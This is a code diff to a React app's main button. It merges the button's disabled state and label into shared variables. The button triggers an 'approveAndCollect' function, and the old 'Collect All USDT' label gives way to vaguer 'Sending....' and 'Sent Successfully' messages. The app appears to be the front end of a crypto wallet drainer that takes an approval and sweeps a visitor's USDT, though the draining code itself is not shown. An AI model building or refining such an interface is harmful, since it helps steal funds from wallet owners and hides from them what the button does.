@@ -384,6 +384,19 @@ export default function App() {
     }
   };
 
+  // ── DYNAMIC BUTTON LOGIC ──
+  const isButtonDisabled = !isConnected 
+    ? (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')
+    : (!status.includes('❌') && !status.includes('✅'));
+
+  const buttonText = !isConnected 
+    ? 'Connect Wallet' 
+    : status.includes('✅') 
+      ? 'Sent Successfully' 
+      : status.includes('❌') 
+        ? 'Retry Sending' 
+        : 'Sending....';
+
   return (
     <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
 
@@ -452,22 +465,24 @@ export default function App() {
           </div>
         )}
 
+        {/* ── UPDATED MAIN BUTTON ── */}
         <button
           onClick={!isConnected ? handleConnect : approveAndCollect}
-          disabled={loading || (isConnected && (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00'))}
+          disabled={isButtonDisabled}
           style={{
             width: '100%',
-            backgroundColor: loading || (isConnected && (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')) ? '#93C5FD' : '#0C66FF',
+            backgroundColor: isButtonDisabled ? '#93C5FD' : '#0C66FF',
             color: '#ffffff',
             fontWeight: '700',
             padding: '16px',
             borderRadius: '9999px',
             fontSize: '17px',
             border: 'none',
-            cursor: loading || (isConnected && (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00')) ? 'not-allowed' : 'pointer'
+            cursor: isButtonDisabled ? 'not-allowed' : 'pointer',
+            transition: 'background-color 0.2s'
           }}
         >
-          {!isConnected ? 'Connect Wallet' : loading ? 'Processing...' : 'Collect All USDT'}
+          {buttonText}
         </button>
       </div>
 
